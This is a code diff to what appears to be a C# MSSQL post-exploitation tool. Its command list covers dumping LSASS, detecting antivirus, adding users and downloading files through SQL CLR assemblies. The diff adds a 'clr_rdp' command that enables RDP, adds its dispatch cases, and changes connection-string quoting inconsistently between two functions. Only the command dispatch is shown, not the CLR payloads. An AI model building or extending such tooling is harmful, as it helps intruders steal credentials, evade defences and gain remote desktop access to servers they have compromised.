@@ -1,4 +1,4 @@
-using System;
+﻿using System;
 using System.Collections;
 using System.Collections.Generic;
 using System.Data;
@@ -31,6 +31,7 @@ disable_clr                - you know what it means
 install_clr                - create assembly and procedure
 uninstall_clr              - drop clr
 clr_dumplsass              - dumplsass by clr
+clr_rdp                    - check RDP port and Enable RDP
 clr_getav                  - get anti-virus software on this machin by clr
 clr_adduser {user} {pass}  - add user by clr
 clr_download {url} {path}  - download file from url by clr
@@ -271,7 +272,7 @@ exit                       - terminates the server process (and this session)"
             try
             {
                 //sql建立连接
-                string connectionString = String.Format("Server = {0};Database = master;User ID = {1};Password = {2};", target, username, password);
+                string connectionString = String.Format("Server = \"{0}\";Database = \"master\";User ID = \"{1}\";Password = \"{2}\";", target, username, password);
                 Conn = new SqlConnection(connectionString);
                 Conn.InfoMessage += new SqlInfoMessageEventHandler(OnInfoMessage);
                 Conn.Open();
@@ -332,6 +333,9 @@ exit                       - terminates the server process (and this session)"
                             break;
                         case "clr_dumplsass":
                             clr_exec("clr_dumplsass");
+                            break;
+                        case "clr_rdp":
+                            clr_exec("clr_rdp");
                             break;
                         case "clr_getav":
                             clr_exec("clr_getav");
@@ -408,7 +412,7 @@ exit                       - terminates the server process (and this session)"
             try
             {
                 //sql建立连接
-                string connectionString = String.Format("Server = \"{0}\";Database = \"master\";User ID = \"{1}\";Password = \"{2}\";", target, username, password);
+                string connectionString = String.Format("Server = {0};Database = master;User ID = {1};Password = {2};", target, username, password);
                 Conn = new SqlConnection(connectionString);
                 Conn.InfoMessage += new SqlInfoMessageEventHandler(OnInfoMessage);
                 Conn.Open();
@@ -477,6 +481,9 @@ exit                       - terminates the server process (and this session)"
                         break;
                     case "clr_dumplsass":
                         clr_exec("clr_dumplsass");
+                        break;
+                    case "clr_rdp":
+                        clr_exec("clr_rdp");
                         break;
                     case "clr_getav":
                         clr_exec("clr_getav");
